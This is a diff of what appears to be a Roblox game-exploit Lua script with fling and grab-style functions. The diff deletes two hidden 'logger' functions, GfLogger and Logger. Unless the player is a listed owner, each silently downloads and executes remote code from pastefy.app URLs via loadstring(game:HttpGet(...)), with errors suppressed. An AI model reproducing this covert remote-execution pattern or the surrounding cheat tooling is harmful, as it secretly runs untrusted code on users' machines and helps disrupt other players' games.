@@ -456,20 +456,7 @@ function BlobMassless(blob, target, side)
 		blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args3))
 end
 
-function GfLogger()
-    id = {
-        [1] = true,
-    }
 
-    if not id[plr.UserId] then
-        local success, errorMessage = pcall(function()
-            loadstring(game:HttpGet("https://pastefy.app/Z3ljqtf1/raw"))()
-        end)
-
-        if not success then
-        end
-    end
-end
 
 function flingF()
     workspace.ChildAdded:Connect(function(model)
@@ -6299,26 +6286,6 @@ local function removeFromList(listTable, dropdown, inputValue, useRankCheck)
     table.remove(listTable, foundIndex)
     if dropdown then dropdown:Refresh(listTable, true) end
     Notify("Removed", foundName)
-end
-
-function Logger()
-    local plr = game.Players.LocalPlayer
-
-    local BYPASS_ID = 1
-
-    local ownerTable = {}
-    for _, name in ipairs(Owner) do
-        ownerTable[name] = true
-    end
-
-    if not ownerTable[plr.Name] and plr.UserId ~= BYPASS_ID then
-        local success, errorMessage = pcall(function()
-            loadstring(game:HttpGet("https://pastefy.app/hCEj3bd8/raw"))() -- logger
-        end)
-
-        if not success then
-        end
-    end
 end
 
 antiTab:CreateSection("Friendly | Toggle")
